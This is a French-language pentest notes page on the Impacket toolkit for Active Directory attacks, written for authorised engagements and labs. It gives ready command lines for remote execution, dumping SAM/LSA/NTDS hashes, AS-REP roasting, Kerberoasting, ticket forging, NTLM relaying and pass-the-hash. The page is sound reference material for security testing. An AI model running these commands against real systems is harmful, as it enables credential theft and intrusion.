---
titre: "Impacket"
tags: [Outils, AD, windows, SMB, kerberos]
source: https://github.com/fortra/impacket
---

# Impacket

**Boîte à outils réseau Windows/AD** (collection de scripts Python). Le couteau
suisse de l'Active Directory : exécution de commandes à distance, dump de secrets,
attaques Kerberos, relais…

> ⚠️ Uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
sudo apt install impacket-scripts    # Kali (scripts préfixés : impacket-…)
pipx install impacket                # ou depuis PyPI/GitHub
```

## Scripts clés
```bash
# exécution de commandes à distance
psexec.py    DOMAIN/user:pass@10.10.10.10        # SYSTEM (bruyant)
wmiexec.py   DOMAIN/user:pass@10.10.10.10        # plus discret
smbexec.py / atexec.py                            # variantes

# credentials
secretsdump.py DOMAIN/user:pass@10.10.10.10       # dump SAM/LSA/NTDS (hashes)
GetNPUsers.py  DOMAIN/ -usersfile users.txt -no-pass   # AS-REP roasting
GetUserSPNs.py DOMAIN/user:pass -request                # Kerberoasting

# tickets / relais
ticketer.py, getST.py                             # forge de tickets Kerberos
ntlmrelayx.py -tf targets.txt -smb2support         # relais NTLM
smbclient.py / smbserver.py                        # client / serveur SMB
```

## Réflexe
Base de nombreux workflows AD. Les hashes de `secretsdump` → [[Hashcat]]
(mode 1000 NTLM) ou **pass-the-hash** (`-hashes LM:NT`). Cartographie : [[BloodHound]].
